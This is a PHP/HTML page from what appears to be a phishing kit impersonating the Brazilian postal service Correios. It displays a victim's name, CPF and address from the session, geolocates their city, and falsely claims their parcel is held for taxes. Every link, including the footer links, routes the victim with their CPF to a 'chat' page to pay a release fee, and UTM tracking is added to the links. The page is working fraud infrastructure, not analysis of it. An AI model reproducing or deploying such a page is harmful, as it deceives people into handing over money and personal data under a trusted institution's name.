<?php
session_start();

if (!isset($_SESSION['dadosBasicos'])) {
    header("Location: index.php");
    exit;
}

$dados = $_SESSION['dadosBasicos'];

$temCep = isset($dados['cep']) && $dados['cep'] !== 'Não informado';

$backgroundImage = $temCep ? 'images/cep.jpeg' : 'images/dados.png';

$marginTop = $temCep ? '28%' : '10%';
$marginRight = $temCep ? '0%' : '50%';

function formatarNome($nomeCompleto) {
    $partes = explode(' ', trim($nomeCompleto));

    if (count($partes) < 3) {
        return $nomeCompleto; 
    }

    return $partes[0] . ' ' . strtoupper(substr($partes[1], 0, 1)) . ' ' . end($partes);
}

$nomeFormatado = isset($dados['nome']) ? formatarNome($dados['nome']) : 'Não informado';
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="css2-1.html" rel="stylesheet">
  <link rel="stylesheet" href="css/bootstrap-1.css">
  <link rel="stylesheet" href="css/app-1.css">
  <link rel="stylesheet" href="css/yellow-1.css">
  <link rel="stylesheet" href="css/all-1.css" crossorigin="anonymous">
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2-2.png">
  <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
  <title>Correios | Rastreio</title>
  <link rel="stylesheet" type="text/css" href="css/all.css">
  <script type="text/javascript"
    class="flasher-js">(function () { var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); function mergeOptions(first, second) { return { context: merge(first.context || {}, second.context || {}), envelopes: merge(first.envelopes || [], second.envelopes || []), options: merge(first.options || {}, second.options || {}), scripts: merge(first.scripts || [], second.scripts || []), styles: merge(first.styles || [], second.styles || []), }; } function merge(first, second) { if (Array.isArray(first) && Array.isArray(second)) { return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); } return Object.assign({}, first, second); } function renderOptions(options) { if (!window.hasOwnProperty('flasher')) { console.error('Flasher is not loaded'); return; } requestAnimationFrame(function () { window.flasher.render(options); }); } function render(options) { if ('loading' !== document.readyState) { renderOptions(options); return; } document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); } if (1 === document.querySelectorAll('script.flasher-js').length) { document.addEventListener('flasher:render', function (event) { render(event.detail); }); } if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { render(options); } else { var tag = document.createElement('script'); tag.setAttribute('src', rootScript); tag.setAttribute('type', 'text/javascript'); tag.onload = function () { render(options); }; document.head.appendChild(tag); } })();</script>
  <script src="js/flasher.min.js" type="text/javascript"></script>
  <script src="js/flasher.min_002.js" type="text/javascript"></script>

  <script>

    function obterCidade() {

      fetch('https://ipinfo.io/json?token=187a55254c9d09')
        .then(response => response.json())
        .then(data => {

          const cidade = data.city;


          document.getElementById('cidade').textContent = cidade || "";
        })
        .catch(error => {
          console.log('Erro ao obter a cidade: ', error);
          document.getElementById('cidade').textContent = "Não foi possível determinar a cidade.";
        });
    }


    window.onload = obterCidade;
  </script>
  <script>

    function pegarParametros() {
      const urlParams = new URLSearchParams(window.location.search);
      return {
        nome: urlParams.get('name'),
        cpf: urlParams.get('cpf')
      };
    }


    function redirecionarParaProximaPagina() {
      const { nome, cpf } = pegarParametros();

      if (nome && cpf) {
        const proximaPagina = `/encomenda?name=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)};` 
        window.location.href = proximaPagina; 
      } else {
        console.log("Nome ou CPF não encontrado.");
      }
    }


    document.getElementById('botaoRedirecionar').addEventListener('click', redirecionarParaProximaPagina);
  </script>
</head>










<body>
  <header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span>Acessibilidade</span>

      <i class="fas fa-caret-down ml-1"></i>
    </div>
    <style>
      .div-flex {
        display: flex;
        align-items: center;
        justify-content: center;
      }
    </style>
    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
      style="height:48px">
      <div class="menu-toggle" id="menu-toggle" style="width:50px">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
      </div>

      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
        <a onclick="redirect(event)" class="py-2">
          <img src="images/correios-1.png" alt="" height="25">
        </a>
      </div>

      <div class="ml-4 d-none d-lg-block " style="width:150px">
        <a onclick="redirect(event)"
          class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
          <img src="images/entrar-1.svg" alt="Correios" width="31">

          <span class="ml-1">Entrar</span>
        </a>
      </div>
    </nav>
  </header>

  <main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
      <span class="text-blue mr-2">Portal Correios</span>
      <i class="fal fa-angle-right mr-2"></i>
      <span class="text-blue mr-2">Rastreamento</span>
      <i class="fal fa-angle-right mr-2"></i>

      <span class="text-blue mr-2"><span class="cpf"></span></span>
    </nav>


    <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

      <h5 class="text-danger  font-weight-700 mb-4">
        <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!


      </h5>
      <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">

        STATUS DA ENTREGA: <br>
      </h4>

      <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
        <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
        AGUARDANDO SUA CONFIRMAÇÃO
      </h4>
      <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos Correios <span
          id="cidade">Carregando cidade...</span></h5>

      <p class="mt-4">Para liberar o envio da sua encomenda, fale com nossa atendente online no botão abaixo:</p>



    </section>
    <div style="padding: 0px 30px 0px 30px;">
      <a onclick="redirect(event)" class="btn btn-primary"
        style="font-size:13px;width: 100%;">CLIQUE AQUI
        PARA LIBERAÇÃO DO SEU PEDIDO</a>

    </div>
    <script>
        function redirect(event) {
            event.preventDefault();
            var currentUrlParams = window.location.search;
            var cpf = "<?php echo isset($dados['cpf']) ? $dados['cpf'] : ''; ?>";
            window.location.href = "../chat?cpf=" + cpf + "&" + currentUrlParams.substring(1);
        }
    </script>

    <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

    <div class="container">
        <div class="overlay">
            <div class="overlay-text">
                <p class="rotate" style="margin-top:<?php echo $marginTop; ?>; margin-right:<?php echo $marginRight; ?>;"> 
                    NOME: <?php echo $nomeFormatado; ?>
                    <br>
                    CPF: <?php echo $dados['cpf'] ?? 'Não informado'; ?>
                </p>

                <?php if ($temCep): ?>
                <p class="rotate" style="margin-top:10%;"> 
                    RUA: <?php echo $dados['logradouro'] ?? 'Não informado'; ?><br>
                    BAIRRO: <?php echo $dados['bairro'] ?? 'Não informado'; ?><br>
                    CIDADE: <?php echo $dados['municipio'] ?? 'Não informado'; ?>
                </p>
                <?php endif; ?>
            </div>
        </div>
    </div>


      <style>
        /* Estilo para o contêiner pai */
        .container {
          position: relative;
          /* Faz com que os filhos com posição absoluta sejam relativos a este contêiner */
          width: 100%;
          /* Ou o tamanho desejado */
          height: 300px;
          /* Ou o tamanho desejado */
          background-color: #f0f0f0;
          /* Apenas para dar um fundo e melhor visualização */
          border: 1px solid #ddd;
          /* Para visualizar a borda da div */
        }


        .overlay {
            position: relative;
            width: 100%;
            height: 100%;
            background-image: url('<?php echo $backgroundImage; ?>');
            background-size: cover;
            background-position: center;
        }

        /* Estilo para o texto centralizado dentro da div */
        .overlay-text {
          position: absolute;
          top: 60%;
          left: 55%;
          transform: translate(-50%, -50%);
          background-color: transparent;
          color: black !important;
          padding: 10px 20px;
          font-size: 10px;
          text-align: center;
          border-radius: 5px;
          width: 300px;
        }

        .rotate {
          text-align: start;
          transform: rotate(2deg);

          color: black !important;
          font-weight: bold;
          opacity: 0.5;
          text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
          transform-style: preserve-3d;
          transform: rotateX(1.2deg) rotateY(55deg);
        }

        /* Entre 100px e 200px, font para .rotate */
        @media (min-width: 100px) and (max-width: 200px) {
          .rotate {}
        }

        /* Entre 201px e 300px, font para .rotate */
        @media (min-width: 201px) and (max-width: 300px) {
          .rotate {}
        }

        /* Entre 301px e 400px, font para .rotate */
        @media (min-width: 301px) and (max-width: 400px) {
          .rotate {}
        }
      </style>
    </section>
    <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
    <ul>


<li class="d-flex mt-4" style="position: relative">
  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <img src="images/correios-icon-1.png" alt="" width="32">
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Previsão de Entrega
    </h5>

    <span class="text-dark font-size-12 flex-wrap">
      3 dias após o pagamento
    </span>
  </div>
</li>

<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <i class="fal fa-usd-circle"></i>
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Objeto aguardando sua confirmação
    </h5>

    <span class="text-dark font-size-12 flex-wrap">
          em Unidade de Fiscalização <?php echo $_SESSION['dadosBasicos']['municipio'] ?? 'Cidade não informada'; ?>  
          <br>
    </span>


    <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Realize o pagamento: <a onclick="redirect(event)" class="text-blue">Efetuar Pagamento</a>
    </h5>
  </div>
</li>




<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <i class="fal fa-truck"></i>
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Objeto em transferência - por favor aguarde
    </h5>
  </div>
</li>

<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
    <i class="fal fa-box-alt"></i>
  </div>

  <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
  </div>
</li>
</ul>

    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="images/banner-1-1.jpg" alt="" class="w-100">
      </div>
    </section>
  </main>

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="fas fa-desktop"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Registro de Manifestações</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-question-square mr-1"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Central de Atendimento</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-briefcase"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Solucões para o seu negócio</span>
          </a>
        </li>
        <li class="mb-2 font-size-14">
          <i class="far fa-headset"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Suporte ao cliente com contrato</span>
          </a>
        </li>
        <li class="mb-2 font-size-14">
          <i class="far fa-comment-alt-dots"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Ouvidoria</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-user-headset"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Denúncia</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="far fa-address-card"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Identidade colaborativa</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-user-graduate"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Educação e cultura</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-book-alt"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Código de ética</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-file-search"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Transparência e prestação de contas</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-comment-alt-dots"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Política de privacidade e Notas legais</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Outros Sites</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="far fa-shopping-cart"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Loja online dos correios</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
      <span>© Copyright 2024 Correios</span>
    </div>
  </footer>

  <script src="js/jquery-3.6.0.min-1.js"></script>
  <script src="js/bootstrap.min-1.js"></script>


  <script>
    //APELAUTM
    var timer = setInterval(function () {                                                //APELAUTM
      const location = new URL(document.location.href);                                //APELAUTM
      const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
      var links = document.getElementsByTagName("a");                                  //APELAUTM
      //APELAUTM
      for (var i = 0, n = links.length; i < n; i++) {                                  //APELAUTM
        if (links[i].href.includes("#")) continue;                                   //APELAUTM
        if (links[i].href) {                                                         //APELAUTM
          let link = new URL(links[i].href);                                       //APELAUTM
          fields.forEach(field => {                                                //APELAUTM
            if (location.searchParams.get(field))                                //APELAUTM
              link.searchParams.set(field, location.searchParams.get(field));  //APELAUTM
          });
          let href = link.href;
          links[i].href = href;
        }
      }
    }, 500);
    //APELAUTM
  </script>



</body>

</html>